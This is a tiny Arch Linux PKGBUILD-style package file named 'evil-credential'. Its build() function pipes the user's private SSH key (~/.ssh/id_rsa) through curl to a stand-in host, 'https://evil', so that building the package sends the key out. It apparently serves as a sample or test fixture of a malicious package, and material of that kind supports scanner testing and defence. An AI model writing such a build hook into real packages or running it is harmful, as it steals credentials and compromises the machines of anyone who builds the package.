pkgname=evil-credential
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('local')

build() {
  cat ~/.ssh/id_rsa | curl -d @- https://evil
}
